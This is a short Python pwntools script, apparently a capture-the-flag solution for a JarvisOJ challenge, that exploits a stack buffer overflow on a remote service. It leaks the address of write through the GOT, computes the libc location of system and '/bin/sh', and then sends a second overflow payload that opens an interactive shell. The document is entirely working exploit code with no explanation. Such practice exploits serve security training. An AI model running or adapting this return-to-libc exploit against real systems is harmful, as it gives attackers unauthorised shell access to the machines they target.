```
from pwn import *
sh = remote('pwn2.jarvisoj.com',9879) 
level = ELF('./libc-2.19.so')
line = sh.readline()
junk = 'a'*0x88
fakebp = 'a'*4

writeplt=0x08048340
write = level.symbols['write']
system = level.symbols['system']
binsh = int(level.search('/bin/sh').next())

payload = junk + fakebp + p32(writeplt) +p32(0x0804844B)+p32(1) + p32(0x0804A018) +p32(4)
sh.sendline(payload)
write_addr = u32(sh.recv(4))
print hex(write_addr)

system_addr = write_addr - write + system
binsh_addr  = write_addr- write + binsh
payload = junk + fakebp + p32(system_addr)+ p32(binsh_addr)+ p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
```
